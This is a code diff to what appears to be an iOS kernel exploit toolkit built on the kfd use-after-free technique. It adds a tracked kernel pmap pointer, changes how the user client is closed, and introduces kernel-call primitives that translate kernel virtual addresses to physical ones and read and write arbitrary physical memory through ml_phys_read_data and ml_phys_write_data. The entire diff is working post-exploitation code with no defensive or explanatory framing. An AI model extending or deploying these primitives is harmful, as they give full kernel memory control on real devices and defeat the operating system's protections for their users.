@@ -21,6 +21,7 @@ uint64_t _self_task = 0;
 uint64_t _self_proc = 0;
 uint64_t _kslide = 0;
 uint64_t _kern_proc = 0;
+uint64_t _kern_pmap = 0;
 
 uint64_t _fake_vtable = 0;
 uint64_t _fake_client = 0;
@@ -42,6 +43,10 @@ uint64_t get_kernproc(void) {
     return _kern_proc;
 }
 
+uint64_t get_kernpmap(void) {
+    return _kern_pmap;
+}
+
 void set_selftask(void) {
     _self_task = ((struct kfd*)_kfd)->info.kernel.current_task;
 }
@@ -58,7 +63,9 @@ void set_kernproc(void) {
     _kern_proc = ((struct kfd*)_kfd)->info.kernel.kernel_proc;
 }
 
-
+void set_kernpmap(void) {
+    _kern_pmap = ((struct kfd*)_kfd)->info.kernel.kernel_pmap;
+}
 
 uint64_t do_kopen(uint64_t puaf_pages, uint64_t puaf_method, uint64_t kread_method, uint64_t kwrite_method)
 {
@@ -79,6 +86,7 @@ uint64_t do_kopen(uint64_t puaf_pages, uint64_t puaf_method, uint64_t kread_meth
     set_selfproc();
     set_kslide();
     set_kernproc();
+    set_kernpmap();
     
     _offsets_init();
     initKernRw(get_selftask(), kread64, kwrite64);
@@ -291,7 +299,7 @@ int kalloc_using_empty_kdata_page(void) {
     allocated_kmem[0] = kalloc(0x1000);
     allocated_kmem[1] = kalloc(0x1000);
 
-    mach_port_deallocate(mach_task_self(), _user_client);
+    IOServiceClose(_user_client);
     _user_client = 0;
     usleep(10000);
 
@@ -344,4 +352,42 @@ int term_kcall(void) {
     _user_client = 0;
     
     return 0;
+}
+
+uint64_t kvtophys(uint64_t kvaddr){
+    uint64_t ret;
+    uint64_t src = kvaddr;
+    
+    uint64_t kernel_pmap_min = kread64(get_kernpmap() + 0x10);
+    uint64_t kernel_pmap_max = kread64(get_kernpmap() + 0x18);
+    
+    uint64_t is_virt_src = src >= kernel_pmap_min && src < kernel_pmap_max;
+    if(is_virt_src) {
+        ret = kcall(off_pmap_find_phys + get_kslide(), get_kernpmap(), src, 0, 0, 0, 0, 0);
+        if(ret <= 0) {
+            return 0;
+        }
+        
+        uint64_t phys_src = ((uint64_t)ret << vm_kernel_page_shift) | (src & vm_kernel_page_mask);
+        printf("phys_src: 0x%llx\n", phys_src);
+        return phys_src;
+    }
+    return 0;
+}
+
+uint64_t physread64(uint64_t pa)
+{
+    kern_return_t ret;
+    union {
+        uint32_t u32[2];
+        uint64_t u64;
+    } u;
+
+    u.u32[0] = (uint32_t)kcall(off_ml_phys_read_data + get_kslide(), pa, 4, 0, 0, 0, 0, 0);//(uint32_t)ret;
+    u.u32[1] = (uint32_t)kcall(off_ml_phys_read_data + get_kslide(), pa+4, 4, 0, 0, 0, 0, 0);
+    return u.u64;
+}
+
+void physwrite64(uint64_t paddr, uint64_t value) {
+    kcall(off_ml_phys_write_data + get_kslide(), paddr, value, 8, 0, 0, 0, 0);
 }
